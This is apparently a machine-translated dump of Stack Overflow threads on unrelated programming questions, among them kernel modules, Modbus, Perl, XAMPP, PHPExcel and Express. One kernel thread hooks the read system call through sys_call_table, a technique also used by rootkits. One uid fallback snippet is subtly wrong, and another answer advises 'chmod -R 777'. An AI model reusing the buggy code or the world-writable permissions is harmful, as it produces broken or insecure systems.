[在 Macrosoft PowerPoint 中绘制一张图片，然后单击“另存为图片”以获得透明背景。](https://i.stack.imgur.com/SUJvF.jpg)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2015-04-27T12:37:04.510

像这样简单使用类型到 ARGB

```
BufferedImage image = new BufferedImage(
                 width, height,
                 BufferedImage.TYPE_INT_ARGB); 
```

我希望它应该工作。

# algorithm - 算法可以检测讽刺吗

> ID：14097388
> 
> 赞同：37
> 
> 时间：2012-12-31T04:21:12.483
> 
> 标签：algorithm, nlp

我被要求编写一个算法来检测讽刺，但我在逻辑中遇到了一个缺陷（或看起来像一个缺陷）。

例如，如果一个人说

> A：我喜欢贾斯汀·比伯。你喜欢他吗？
> 
> B：是的。当然。*我绝对爱他。*

现在这可能被认为是讽刺与否，唯一知道的方法似乎是知道 B 是否认真。

（我不应该深入。我们得到了一堆短语，只是被告知如果这些在句子中，那么它是讽刺的，但我感兴趣？）

有没有办法解决这个问题？还是计算机在讽刺方面绝对卡住了？

（我想这取决于扬声器的语气，但我的输入是文本）

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-12-31T09:25:50.557

看起来有研究试图这样做，但他们还没有提出一个运行良好的算法。

来自[González-Ibáñez, R. 等人。“识别 Twitter 中的讽刺：仔细观察”](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.207.5253&rep=rep1&type=pdf)

> 讽刺和反讽是语言学、心理学和认知科学中经过充分研究的现象[...]。但是在文本挖掘文献中，讽刺的自动检测被认为是一个难题[...]，并且仅在少数研究中得到解决。[...] 与我们最密切相关的工作是 Davidov 等人的工作。(2010)，其目标是识别 Twitter 和亚马逊产品评论中的讽刺和非讽刺话语。在本文中，我们考虑了区分讽刺推文和非讽刺推文的难度更大的问题

他们得出结论：

> 也许不足为奇的是，无论是人类评委还是机器学习技术都表现不佳。[...] 我们的结果表明，仅词汇特征不足以识别讽刺，语用和上下文特征值得进一步研究

这是另一篇最近的相关论文：
[Reyes, A. “从幽默识别到反讽检测：社交媒体的比喻语言”](http://dblab.mgt.ncu.edu.tw/%E6%95%99%E6%9D%90/2012_SNM/90.pdf)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-12-31T04:41:25.527

> ...句子是由用户编写的。这是2个人之间的模拟对话。

用一个短语来检测讽刺几乎是不可能的，但在上下文中它可能更可行。让我们假设您可以解析句子并解释其字面意思（这不是一项简单的任务，但该问题至少在一定程度上得到了解决）。

你现在有来自：

1.  对话中的所有短语。
2.  *另*一位发言者的回应。

## 交叉引用的短语

要利用 #1，您可以相互交叉引用所有短语。它们中的任何一个直接矛盾吗？

例子：

*演讲者 1*：我爱贾斯汀比伯。你？
*扬声器2*：完全！我爱他。
*演讲者1*：你最喜欢他的什么？
*演讲者2*：他的音乐很棒！
*演讲者1*：真的吗？你最喜欢的歌是什么？
*演讲者2*：来吧，你知道我讨厌他的音乐。

我们知道有两个矛盾的短语，“我爱他！” 和“我讨厌他的音乐”。至少有可能发生了讽刺。

## 其他演讲者的问题或回应

方法#2 可能更有效（或无用......也许讽刺是众所周知的，但在两方之间没有说出来）。

例子：

*演讲者 1*：贾斯汀比伯在城里。我真要去见他。
*扬声器 2*：哈。

另一个例子：

*演讲者 1*：我爱贾斯汀比伯。你？
*演讲者 2*：我的床头上有一张他的巨幅海报。
*演讲者 1*：是的。

更详细地说，您可以应用启发式方法来确定对话在特定短语后偏离的剧烈程度。

*演讲者1*：我非常喜欢贾斯汀比伯！！！你是？
[演讲者 1 发表了强调声明]
*演讲者 2*：是的，当然。
[讽刺。我们不知道，但谈话中的另一个人知道。]

Speaker 1 现在走什么方向？他们改变话题了吗？根据谈话的激烈程度，它可能表明他们对感知反应的反应。

综上所述，其中大部分都需要复杂的处理，我预计最多只能有非常低的准确率。但这是一个有趣的问题。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-31T04:29:57.047

讽刺真的是说话的语气，文字没有声调，这句话的真实性也可以确定它的讽刺......

如果输入由用户输入，则有两种方法可以做到。

一种是基于他们使用互联网术语编写的内容。

例如：

用户可能键入：

`"Yeah. Sure. I absolutely love him. /sarcasm"`

您可以查找诸如此类的`/sarcasm` `[/sarcasm]`关键字

* * *

或者，您可以使用统计赔率：

`"Yeah, and I'm the president of USA"`....它实际上正确的统计几率是如此之低，以至于可以被标记为讽刺。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-31T04:30:21.170

那么，从文化或语言的角度来看，讽刺究竟是什么？如果你想解决这个复杂的问题，你必须澄清这一点。这个问题非常复杂，因为要求在某些人类语言中使用人工智能。你可以看看[ALICE](http://www.pandorabots.com/pandora/talk?botid=f5d922d97e345aa1)以获得一些灵感。

# c - 编写Linux内核模块时如何获取用户ID

> ID：14097389
> 
> 赞同：5
> 
> 时间：2012-12-31T04:21:19.590
> 
> 标签：c, linux-kernel

这是我在内核模块中的函数，我在稍后阶段使用`insmod`命令插入它。`make`我正在努力 `goldfish (2.6.29)`

```
asmlinkage long our_sys_read(unsigned int fd, char  *buf, size_t count)
{
      printk("------->> our_sys_read getuid() ---------- %d\n", getuid());

      return original_call_read(fd,buf,count);
} 
```

我想捕获系统调用并找出是哪个用户进行了这些系统调用。但是当我运行'make'时，它会引发以下错误。

```
/home/mohsin/LKM/trapcall.c:245: error: implicit declaration of function 'getuid' 
```

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-31T14:44:24.743

你也许可以使用这个：

```
 #include <include/linux/cred.h>

 static int getuid()
 {
     return current_uid();
 } 
```

cred 代表“凭据”，此宏返回当前活动凭据的用户 ID。但是请记住，“当前用户 id”在 Linux 中可能意味着多种含义。

[dan3 显然不需要像我那样深入挖掘代码来找到这个 - 或者他比我先开始！]

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-03T07:47:20.637

花了两天时间，终于弄明白怎么获取系统调用进程的uid了。我将给出我在不同链接上找到的所有建议，以便如果我的解决方案不起作用，其他一个可能会起作用。

1）正如告诉我的垫子，

```
#include <include/linux/cred.h>

 static int getuid()
 {
     return current_uid();
 } 
```

你调用这个函数来获取 uid 但它给了我负数等`-943124788`。

2)

```
uid_t credd_uid ;
const struct cred *cred = current_cred();
credd_uid = current->cred->uid; 
```

与大负数相同的输出。

3)

```
uid_t struct_uid;
struct user_struct *u = current_user();

struct_uid = get_uid(u); 
```

4）**工作解决方案**

它实际上是[在这里给出的。](http://www.faqs.org/docs/kernel/x931.html)

i) 在顶部声明函数原型，如

```
asmlinkage int (*getuid_call)(); 
```

ii) 将以下行添加到 init_module() 函数

/* 获取 getuid 的系统调用 */

```
 getuid_call = sys_call_table[__NR_getuid]; 
```

iii）在你被困的系统调用函数中调用函数来获取 uid

```
uid_t uid = getuid_call(); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-12-31T14:34:17.580

需要调用current_uid()，定义在linux/cred.h中（2.6开始，以前是current->uid）。请参阅[有关凭据的内核文档](http://www.kernel.org/doc/Documentation/security/credentials.txt)

current 是一个[宏](http://www.geeksww.com/tutorials/operating_systems/linux/tips_and_tricks/linux_kernel_data_structures_part_1__the_current_macro.php)，顺便说一句。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-05-11T21:03:18.930

在不使用`getuid`系统调用挂钩的情况下获取 UID：

```
#include "linux/cred.h"

static inline uid_t get_uid(void) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0)
#include "linux/uidgid.h"
    // current_uid() returns struct in newer kernels
    return __kuid_val(current_uid());
#else
    return 0 == current_uid();
#endif
} 
```

您还应该查看`linux/uidgid.h`定义 ROOT uid/gid 的有用宏以及内联比较函数以避免直接调用`__kuid_val()`.

例如，一个常见的用途是检查用户是否为 root：

```
static inline bool is_root_uid(void) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0)
#include "linux/uidgid.h"
    // current_uid() returns struct in newer kernels
    return uid_eq(current_uid(), GLOBAL_ROOT_UID);
#else
    return 0 == current_uid();
#endif
} 
```

# c# - Modbus 自定义消息和子功能（NModbus、TCP、子功能）

> ID：14097393
> 
> 赞同：5
> 
> 时间：2012-12-31T04:22:00.723
> 
> 标签：c#, modbus

我在 C# 项目中使用 NModbus，从/向多个 I/O 设备读取和写入 Modbus 数据。我在程序中使用 Modbus TCP/IP 协议（​​ModbusIpMaster 等）。

我已经成功地与设备通信（通过 Modbus 网关）并且可以使用默认方法（例如常见的 Modbus 函数，如 ReadHoldingRegisters、WriteCoils ）来访问来自设备的数据，并可以写回它们。目前，我能做的只是默认的 NModbus 方法，这些方法公开常用的 Modbus 代码（1、2、3、4 等）。

**我有两个困难：**

**1)**可以在 Modbus 代码 70 (0x46) 下访问 I/O 设备的设置和额外信息，并且**我需要使用一些子功能来读取和/或写入设置**。

例如，Func 07 (0x46)、Sub func 6 (0x06) 可用于设置模块的通信设置。在此示例中，有 7 个字节的信息要发送，其中包含设置（例如波特率等...）

NModbus 没有针对此“自定义”功能代码 (70) 的特定方法。因此，据我了解，需要使用 NModbus 的 CustomMessage 功能。我曾尝试执行CustomMessage，当使用常用的Modbus 功能代码（例如1 或2）时，我可以达到与使用NModbus 的默认方法相同的结果（即CustomMessage 到目前为止正在工作）。

当我尝试除一般功能代码以外的功能代码（例如 1、2、3...）时，我确实会遇到各种异常。此外，我不知道我应该如何发送带有消息的子功能！

当我在功能代码之后添加子功能（例如70后跟06），并且数据通过我发送，异常。我真的需要这个领域的专家的帮助，拜托。

这是一个更明显的例外：

> *" 引发了 'Modbus.SlaveException' 类型的异常。功能代码：198 异常代码：3 - 查询数据字段中包含的值不是服务器（或从机）允许的值。这表明结构中的错误复杂请求的其余部分，例如隐含长度不正确。这并不意味着提交存储在寄存器中的数据项具有超出应用程序预期的值，因为 MODBUS 协议不知道其重要性任何特定寄存器的任何特定值。”*

**2)**第二个问题是通过 Modbus**发送 ASCII RS-232**消息，以控制连接到具有转换 Modbus 消息能力的模块的 COM1 的 RS-232 设备。换句话说，我打算与 Modbus 网关通信，将 ASCII 数据发送到其 COM1，然后将数据转换为 RS-232，然后与 RS-232 设备通信。翻译是在网关内部进行的，所以我只需要知道如何在地球上发送这些消息，这些消息的长度各不相同。我不知道这怎么可能，以及从哪里开始。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-15T08:23:16.987

第**2**部分- NModbus 允许您通过 TCP 或 UDP 客户端创建 ASCII 主站。

```
using (TcpClient client = new TcpClient("127.0.0.1", 502))
{
    ModbusSerialMaster master = ModbusSerialMaster.CreateAscii(client);

    // Use the master here
} 
```

关于问题的第一部分，NModbus 非常适合基础知识，但它缺乏允许任意扩展的抽象层。当我发现需要大量修改才能添加 GetServerId 函数并使其工作时，我自己的经验就结束了，即使这是 Modbus RTU 规范的一部分。我的解决方案是从头开始重新实现它，（这比让 NModbus 源首先编译和运行花费的时间更少，因为它依赖于第三方库进行日志记录等以及缺少 IEnumerable 的扩展类）。

# perl - Perl 打印设备列表

> ID：14097397
> 
> 赞同：1
> 
> 时间：2012-12-31T04:22:10.693
> 
> 标签：perl, shell

我有一个包含设备名称的文件，它是 shell 脚本的输出，具体取决于区域。所以区域是可变的，可以更改....例如 devicelist=device.region

现在我想将此设备列表添加到电子邮件正文中。为了发送电子邮件，我使用 perl 脚本，我尝试了以下方法，但它不起作用......

```
my $file = "$ENV{devicelist}";
open my $fh, '<', $file;
print while (<$fh>);

I am getting this message as :  GLOB(0x11aeea8) 
```

Perl 脚本....

```
my $file = "/tmp/devicelist";open my $fh, '<', $file;print while (<$fh>);
$logger->debug("$logid >> Device names is $deviceinfo");

         $smtp->datasend("Customer Name : $custname\n\n");
         $smtp->datasend("Site Location : $sitename\n\n");
         $smtp->datasend("Region : $region\n\n");
         my $file = "/tmp/devicelist";
         open my $fh, '<', $file;
         print while (<$fh>);
         $smtp->datasend("Device Info : $deviceinfo\n\n"); 1st way
         $smtp->datasend("Device Info perl : $fh\n\n"); 2nd way 
```

当有超过 10 台设备停机并且我想显示这 10 台设备名称时，此请求正在处理我发送电子邮件的位置。其他信息显示得非常好，因为它们是存储在诸如区域、状态等变量中的单个值...

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-23T18:52:35.233

你所需要的只是改变

```
print while (<$fh>); 
```

至

```
$smtp->datasend($_) while (<$fh>); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:38:49.590

您是否在问如何将文件的内容加载到变量中？

```
my $file; { local $/; $file = <$fh>; } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T05:41:56.517

默认情况下打印到标准输出，而不是发送到`$smtp->data send()`发送字符串参数的同一个地方。

我认为您只想重新编写您的 while 循环并正确引导输出；所以...

```
print while (<$fh>); #is basically saying:
while (<$fh>) {
  print;
} #but in your smtp block, you don't want to be printing, so write
foreach $fileline (<$fh>) { $smtp->datasend($fileline); } 
```

一旦你尝试了，如果它正在工作，因此这解释了哪里出了问题，然后考虑一下用类似的东西一次吞下整个文件：

```
my $file = "/tmp/devicelist";
open my $fh, '<', $file;
my $filecontents; { local $/; $filecontents = <$fh>; }
$smtp->datasend($filecontents); 
```

除此之外，当你说：

```
print while (<$fh>);

I am getting this message as :  GLOB(0x11aeea8) 
```

你的意思是，你不想得到 GLOB(0x11aeea8) 或者这是正确的输出？如果是前者，我认为那是因为你想写这样的东西：

```
while (<$fh>) {print $_;} 
```

# mysql - Xampp 不会在 Mac OSX 上启动 MySQL 服务器？

> ID：14097399
> 
> 赞同：9
> 
> 时间：2012-12-31T04:22:47.083
> 
> 标签：mysql, macos, osx-lion, xampp

我在 Mac OSX Mountain Lion 上。Xampp 不会让我启动 MySQL 服务器。

我已将 XAMPP 文件夹中的每个人和每个文件的权限设置为读/写。

![在此处输入图像描述](../Images/07445adbbe82ac668acd41c32aab6b3c.png)

错误消息显示“无法完成操作。（XAMPPErrorDomain 错误 1。）”

关于如何停止其他 MySQL 进程的任何想法。我已尝试按照 Lynda.com 修复端口冲突的教程进行操作。我尝试在终端中输入此命令“sudo lsof -i -P | grep 3306”。

但是它没有用，我想测试一下 MySQL 是否正在运行，但是没有任何返回。如何检查是否有其他版本正在运行，然后停止任何其他 MySQL 服务器/卸载其他可能的版本？

这是错误日志截图？那是你要找的吗？ ![在此处输入图像描述](../Images/93fc0b76aed3a191a29b9c20d52e47f9.png)

![在此处输入图像描述](../Images/e338f9f5775994fb983e2fc3a6abbae5.png)

***这是错误日志：***

```
[Tue Dec 11 10:46:28 2012] [warn] Init: Session Cache is not configured [hint: SSLSessionCache]
[Tue Dec 11 10:46:29 2012] [notice] Digest: generating secret for digest authentication ...
[Tue Dec 11 10:46:29 2012] [notice] Digest: done
[Tue Dec 11 10:46:29 2012] [notice] Apache/2.2.14 (Unix) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l PHP/5.3.1 mod_perl/2.0.4 Perl/v5.10.1 configured -- resuming normal operations
[Tue Dec 11 11:00:02 2012] [notice] caught SIGTERM, shutting down
[Tue Dec 11 11:00:33 2012] [warn] Init: Session Cache is not configured [hint: SSLSessionCache]
[Tue Dec 11 11:00:34 2012] [notice] Digest: generating secret for digest authentication ...
[Tue Dec 11 11:00:34 2012] [notice] Digest: done
[Tue Dec 11 11:00:34 2012] [notice] Apache/2.2.14 (Unix) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l PHP/5.3.1 mod_perl/2.0.4 Perl/v5.10.1 configured -- resuming normal operations
[Tue Dec 11 14:14:23 2012] [notice] caught SIGTERM, shutting down
[Tue Dec 11 14:17:31 2012] [warn] Init: Session Cache is not configured [hint: SSLSessionCache]
[Tue Dec 11 14:17:32 2012] [notice] Digest: generating secret for digest authentication ...
[Tue Dec 11 14:17:32 2012] [notice] Digest: done
[Tue Dec 11 14:17:32 2012] [notice] Apache/2.2.14 (Unix) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l PHP/5.3.1 mod_perl/2.0.4 Perl/v5.10.1 configured -- resuming normal operations
sendmail: fatal: chdir /Library/Server/Mail/Data/spool: No such file or directory
sendmail: fatal: chdir /Library/Server/Mail/Data/spool: No such file or directory
[Tue Dec 11 16:07:41 2012] [error] [client 127.0.0.1] File does not exist: /Applications/XAMPP/xamppfiles/htdocs/jessleigh/wp-admin/function.unlink, referer: http://localhost/jessleigh/wp-admin/admin.php?page=functions.php
[Tue Dec 11 16:41:51 2012] [notice] caught SIGTERM, shutting down
[Tue Dec 11 17:08:44 2012] [warn] Init: Session Cache is not configured [hint: SSLSessionCache]
[Tue Dec 11 17:08:45 2012] [notice] Digest: generating secret for digest authentication ...
[Tue Dec 11 17:08:45 2012] [notice] Digest: done
[Tue Dec 11 17:08:45 2012] [notice] Apache/2.2.14 (Unix) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l PHP/5.3.1 mod_perl/2.0.4 Perl/v5.10.1 configured -- resuming normal operations
[Tue Dec 11 17:38:02 2012] [error] [client 127.0.0.1] File does not exist: /Applications/XAMPP/xamppfiles/htdocs/xampp/jessleigh
[Tue Dec 11 17:57:29 2012] [error] [client 127.0.0.1] File does not exist: /Applications/XAMPP/xamppfiles/htdocs/xampp/jessleigh
[Tue Dec 11 17:57:39 2012] [notice] caught SIGTERM, shutting down
[Tue Dec 11 17:57:44 2012] [warn] Init: Session Cache is not configured [hint: SSLSessionCache]
[Tue Dec 11 17:57:45 2012] [notice] Digest: generating secret for digest authentication ...
[Tue Dec 11 17:57:45 2012] [notice] Digest: done
[Tue Dec 11 17:57:45 2012] [notice] Apache/2.2.14 (Unix) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l PHP/5.3.1 mod_perl/2.0.4 Perl/v5.10.1 configured -- resuming normal operations
[Tue Dec 11 17:57:46 2012] [error] [client 127.0.0.1] File does not exist: /Applications/XAMPP/xamppfiles/htdocs/xampp/jessleigh
[Tue Dec 11 17:57:47 2012] [error] [client 127.0.0.1] File does not exist: /Applications/XAMPP/xamppfiles/htdocs/xampp/jessleigh
[Tue Dec 11 17:58:01 2012] [error] [client 127.0.0.1] File does not exist: /Applications/XAMPP/xamppfiles/htdocs/xampp/jessleigh
[Tue Dec 11 19:57:16 2012] [error] [client 127.0.0.1] File does not exist: /Applications/XAMPP/xamppfiles/htdocs/jessleigh/sample-page, referer: http://localhost/jessleigh/
[Tue Dec 11 20:07:09 2012] [error] [client 127.0.0.1] File does not exist: /Applications/XAMPP/xamppfiles/htdocs/jessleigh/sample-page, referer: http://localhost/jessleigh/
[Tue Dec 11 20:31:33 2012] [error] [client 127.0.0.1] File does not exist: /Applications/XAMPP/xamppfiles/htdocs/jessleigh/home, referer: http://localhost/jessleigh/wp-admin/post.php?post=41&action=edit&message=6
[Fri Dec 14 13:15:33 2012] [notice] caught SIGTERM, shutting down
(13)Permission denied: make_sock: could not bind to address [::]:80
(13)Permission denied: make_sock: could not bind to address 0.0.0.0:80
no listening sockets available, shutting down
Unable to open logs
(13)Permission denied: make_sock: could not bind to address [::]:80
(13)Permission denied: make_sock: could not bind to address 0.0.0.0:80
no listening sockets available, shutting down
Unable to open logs
(13)Permission denied: make_sock: could not bind to address [::]:80
(13)Permission denied: make_sock: could not bind to address 0.0.0.0:80
no listening sockets available, shutting down
Unable to open logs
[Fri Dec 14 18:20:53 2012] [warn] Init: Session Cache is not configured [hint: SSLSessionCache]
[Fri Dec 14 18:20:54 2012] [notice] Digest: generating secret for digest authentication ...
[Fri Dec 14 18:20:54 2012] [notice] Digest: done
[Fri Dec 14 18:20:54 2012] [notice] Apache/2.2.14 (Unix) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l PHP/5.3.1 mod_perl/2.0.4 Perl/v5.10.1 configured -- resuming normal operations
[Fri Dec 14 18:24:24 2012] [notice] caught SIGTERM, shutting down
[Tue Dec 18 12:00:06 2012] [warn] Init: Session Cache is not configured [hint: SSLSessionCache]
[Tue Dec 18 12:00:07 2012] [notice] Digest: generating secret for digest authentication ...
[Tue Dec 18 12:00:07 2012] [notice] Digest: done
[Tue Dec 18 12:00:07 2012] [notice] Apache/2.2.14 (Unix) DAV/2 mod_ssl/2.2.14 OpenSSL/0.9.8l PHP/5.3.1 mod_perl/2.0.4 Perl/v5.10.1 configured -- resuming normal operations
: 
```

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-12-31T04:51:27.107

您可以通过在终端中执行来检查是否有任何 mysql 实例正在运行

```
sudo ps aux | grep mysql 
```

这将列出名称中包含 mysql 的所有进程。

```
_mysql          18943   0,0  0,5  2514608  20340 s008  S+    5:46am   0:00.07   /opt/local/libexec/mysqld --basedir=/opt/local --datadir=/opt/local/var/db/mysql5 --  user=_mysql --log-error=/opt/local/var/db/mysql5/Max-NB.local.err --pid-  file=/opt/local/var/db/mysql5/Max-NB.local.pid
root            18900   0,0  0,1  2439964   2592 s008  S+    5:46am   0:00.15 /bin/sh   /opt/local/bin/mysqld_safe5
root            18899   0,0  0,1  2439396   2616 s008  S+    5:46am   0:00.02 sudo   mysqld_safe5 
```

然后，您可以通过执行来终止进程

```
sudo killall mysqld_safe5 
```

您应该用您的 mysql 进程的名称替换“mysqld_safe5”。它很可能是“mysqld”。

之后，您可以尝试重新启动服务器并检查它是否有效。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-09-29T10:24:24.770

```
chmod -R 777 /Applications/XAMPP/xamppfiles/var 
```

为我解决了这个问题。参考 - [StackOverflow 问题](https://stackoverflow.com/a/12324882/240255)

但是不要**在**生产服务器中执行此操作，您可能需要更改所有者或组（`chown`或`chgrp`解决问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-31T04:43:51.140

首先读取位于**/Applications/XAMPP/xamppfiles/logs/error_log**的错误文件，通常如果端口 3306 上已经运行了某些东西，则会发生此错误。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-12T21:35:17.390

我有同样的问题，但设法通过将 my.cnf 替换为原始文件来解决它。它删除了以下行，从而解决了该问题。

```
listen 80 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-09-15T15:34:57.120

您应该尝试配置您的 MySql 数据库并将端口从 3306 更改为 3307，这对我有用。有时此端口很忙，不适用于您的电脑。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-06-05T13:57:11.933

查看错误日志，您可能会发现：

[错误] tc 日志中的魔术头
错误 [错误] 无法初始化 tc 日志

删除 /Applications/XAMPP/xamppfiles/var/mysql/tc.log 并重启 mysql

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2021-06-26T03:03:51.747

你可以在你的 Mac book 上使用 MAMP PRO。但是有一个问题，如果你没有注册或激活它只会工作 14 天。

我在这里分享一些截图......

1.安装后，打开并选择phpMyAdmin [1](https://i.stack.imgur.com/lZDXC.png)

2.next你去数据库[2](https://i.stack.imgur.com/uxY2n.png)

3.然后你可以创建数据库，你可以在那里添加列[3](https://i.stack.imgur.com/dS4gW.png)

# java - 检查一个圆是否完全包含一个圆

> ID：14097403
> 
> 赞同：1
> 
> 时间：2012-12-31T04:23:12.543
> 
> 标签：java, geometry

> **可能重复：**
> [查找一个圆圈是否在另一个圆圈内](https://stackoverflow.com/questions/9486520/finding-if-a-circle-is-inside-another-circle)

如何确定一个圆圈是否完全包含另一个圆圈（在 Java 中）

```
public class Circle {
   //x and y define the top left rectangular region bounding this circle
   private int x, y, radius;
}

public boolean circleContainsCircle(Circle big, Circle small) {

...

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T04:34:37.697

切割两个圆并接触其表面的最大部分是穿过其中心的部分。现在我们可以说，如果这个最长线段的长度小于或等于最大圆的直径，那么较小的圆显然位于大圆内：

```
public boolean circleContainsCircle(Circle big, Circle small) {

    double segment_length = euler_distance(big.center, small.center) + 
        small.radius + big.radius;
    return (segment_length <= 2 * big.radius);

} 
```

# iphone - 检查 NSURLRequest 目标是否为“_blank”？

> ID：14097404
> 
> 赞同：3
> 
> 时间：2012-12-31T04:23:14.570
> 
> 标签：iphone, ios

我正在从我的 UIWebView 监听 url 加载。有没有办法检查请求是否有“_blank”的目标？：

```
- (BOOL) webView:(UIWebView *)webView
         shouldStartLoadWithRequest:(NSURLRequest *)request
         navigationType:(UIWebViewNavigationType)navigationType
{
    if ([request targetIs:@"_blank"]) {
        // do something.
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-09-10T09:59:37.460

不了解 iOS，但对于 OS X，如果您使用策略委托，它可以完美运行。我已经将我的答案放在上面的 Russ 提到的[这个线程中。](https://stackoverflow.com/a/46136134/7450481)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T04:29:58.140

也许您可以使用 [UIWebView -request] 获取 NSURLRequest，并使用 [NSURLRequest URL] 检查 url 是否包含您想要的任何内容。

# node.js - 如何链接到 node_modules 中的 JavaScript 文件？

> ID：14097408
> 
> 赞同：5
> 
> 时间：2012-12-31T04:23:40.013
> 
> 标签：node.js, express

我想链接到`/node_modules/jade/runtime.min.js`客户端——如何让它公开访问？

我`app.get`会以某种方式为它创建一个吗？

```
app.get('/js/jade-runtime.js',<what goes here?>) 
```

或者我可以修改静态的东西以允许它被服务吗？

```
app.use(express.static(path.join(__dirname, 'public'))); // modify this to add more paths somehow 
```

* * *

### 完整的解决方案（感谢[布拉德](https://stackoverflow.com/a/14097444/65387)）：

```
app.get('/js/jade-runtime.js',function(req,res) {
    res.sendfile(path.join(__dirname,'node_modules','jade','runtime.min.js'));
}); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-31T04:28:52.830

您可以将它与您的`app.get`.

```
res.sendfile('jade-runtime.js'); 
```

显然，使用该文件所在位置的正确路径。

[http://expressjs.com/api.html#res.sendfile](http://expressjs.com/api.html#res.sendfile)

# php - 只想使用 PHPExcel 从 excel 文件中打印单元格数据？

> ID：14097411
> 
> 赞同：4
> 
> 时间：2012-12-31T04:24:06.153
> 
> 标签：php, html, phpexcel

```
<?php

error_reporting(E_ALL);
set_time_limit(0);

date_default_timezone_set('Europe/London');

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<title>PHPExcel Reader Example #09</title>

</head>
<body>

<?php

/** Include path **/
set_include_path(get_include_path() . PATH_SEPARATOR . '../../../Classes/');

/** PHPExcel_IOFactory */
include 'C:\webserver\www\Classes\PHPExcel\IOFactory.php';

$inputFileType = 'Excel5';
//  $inputFileType = 'Excel2007';
//  $inputFileType = 'Excel2003XML';
//  $inputFileType = 'OOCalc';
//  $inputFileType = 'Gnumeric';
$inputFileName = './sampleData/Book1.xls';
$sheetname = 'Data Sheet #3';

class MyReadFilter implements PHPExcel_Reader_IReadFilter
{
    public function readCell($column, $row, $worksheetName = '') {

        if ($row >= 1 && $row <= 1) {
            if (in_array($column,range('A','A'))) {
                return true;
            }
        }
        return false;
    }
}

$filterSubset = new MyReadFilter();

$objReader = PHPExcel_IOFactory::createReader($inputFileType);
$objReader->setLoadSheetsOnly($sheetname);
$objReader->setReadFilter($filterSubset);
$objPHPExcel = $objReader->load($inputFileName);
$sheetData = $objPHPExcel->getActiveSheet()->toArray(null,true,true,true);
var_dump($sheetData);

?>
<body>
</html> 
```

当我运行 aboce 代码时，它给了我这个输出

```
array(1) { [1]=> array(1) { ["A"]=> string(6) "ABCDEF" } } 
```

在上面的输出 ABCDEF 是第一个单元格数据。所以我只想要 ABCDEF 而不是上面显示的其他东西。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-31T04:29:11.523

*那是因为您要求 PHPExcel 将整个工作表*作为数组提供给您。

如果您只想要单元格 A1 的值，请使用：

```
$objPHPExcel->getActiveSheet()->getCell('A1')->getValue(); 
```

代替

```
$objPHPExcel->getActiveSheet()->toArray(null,true,true,true); 
```

更多关于这个[的文档](http://phpexcel.codeplex.com/releases/view/96183)，在本例中是文件“PHPExcel developer documentation.pdf”。

然后，您还可以完全删除读取过滤器。单元格以惰性方式读取，因此如果您只直接访问单元格 A1，则不会使用读取过滤器保存任何内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-10T08:54:31.043

包括' `C:\webserver\www\Classes\PHPExcel\IOFactory.php`';

这个包含文件是我在这个文件中包含的文件。

# android - 在 Google Play 上找不到我的应用

> ID：14097417
> 
> 赞同：0
> 
> 时间：2012-12-31T04:24:54.930
> 
> 标签：android, publish

我在 20 分钟前上传了我的应用程序，从我读过的所有内容来看，它应该几乎可以立即直接链接到。当我直接链接到它应该在的网站时，它说找不到。我点击了开发者控制台中的发布链接，它说它已发布并可用于 2000 多台设备。我只是不耐烦吗？我只是在网上做了一些搜索，我读过的帖子说它应该立即可用，因为这是我第一个发布的应用程序，我想知道我是否做错了什么。任何见解将不胜感激。

包名是 com.jessenorris.gpacalculator

我试过用这个链接搜索它：https: [//play.google.com/store/apps/details?id=com.jessenorris.gpacalculator](https://play.google.com/store/apps/details?id=com.jessenorris.gpacalculator)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T04:30:49.410

> 准备就绪后，单击 Developer Console 中的 Publish 按钮。在几个小时内，您的应用将可供用户使用，并且您的产品页面将出现在 Google Play 中，供您浏览、搜索或链接您的促销活动。

来自开发者网站[http://developer.android.com/distribute/googleplay/publish/preparing.html#final-checks上的文档](http://developer.android.com/distribute/googleplay/publish/preparing.html#final-checks)

# windows-phone - 提交到 WindowsPhone 8 App Store 时出错：我们无法保存您的信息。再试一次。错误代码：0x80040803

> ID：14097418
> 
> 赞同：0
> 
> 时间：2012-12-31T04:25:05.953
> 
> 标签：windows-phone, windows-phone-8

在将应用程序提交到 Windows Phone 8 商店时，我曾多次看到此错误报告

> 我们无法保存您的信息。再试一次。错误代码：0x80040803。

* * *

